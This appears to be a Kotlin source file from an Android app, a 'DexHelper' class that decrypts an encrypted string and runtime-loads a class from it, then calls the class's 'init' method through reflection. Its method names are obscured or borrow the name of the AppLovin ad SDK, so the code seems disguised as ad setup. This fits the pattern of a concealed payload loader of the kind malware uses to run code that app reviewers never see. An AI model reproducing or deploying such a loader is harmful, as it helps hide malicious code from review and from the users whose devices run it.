package com.whisper.gentle

import android.content.Context
import com.whisper.gentle.core.InitSdk

/**
 * Date：2025/11/18
 * Describe:
 */
class DexHelper {
    lateinit var m: InitSdk

    fun a(context: Context, str: String) {
        //345nuiizkjgasd12
        val key = str.substring(0, 10) + m.key
        m.initJson(String(mInfoD(key.toByteArray(), m.token)))
        appLovin(context, str.substring(10), key)
    }

    private fun appLovin(context: Context, inputStr: String, key: String): String {
        val clz = m.appLovinAction(mInfoD(key.toByteArray(), inputStr), context)
        clz?.getMethod("init", Context::class.java)?.invoke(null, context)
        return key + inputStr
    }

    private fun mInfoD(keyAes: ByteArray, inStr: String): ByteArray {
        return m.appLov(keyAes, inStr)
    }

}